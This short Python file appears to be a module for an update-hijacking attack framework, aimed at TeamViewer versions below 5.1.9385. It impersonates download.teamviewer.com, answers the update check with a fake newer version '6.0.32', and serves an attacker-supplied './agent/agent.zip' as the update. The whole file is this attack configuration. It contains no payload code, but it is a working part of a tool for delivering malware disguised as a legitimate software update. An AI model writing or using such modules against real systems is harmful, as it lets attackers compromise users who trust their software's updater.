from modules import ModuleBase


class TeamViewer(ModuleBase):
    name = 'teamviewer'
    version = '1.0'
    appver = '< 5.1.9385'
    author = ['German Rodriguez < grodriguez +[AT]+ infobytesec.com >']
    description = """TeamViewer""",
    vh = 'download.teamviewer.com' 
    agent_filename = './agent/agent.zip'
    options = {
        'rnd1': {
            'val': 'rand_num(2)',
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd2': {
            'val': 'rand_alpha(rand_num(1))',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': '/download/update/TVversion',
            'type': 'string',
            'method': '',
            'bin': '0',
            'string' : "6.0.32",
            'parse': '1',
            'file': '',
        }, {
            'path': '.zip',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': ''
        }]

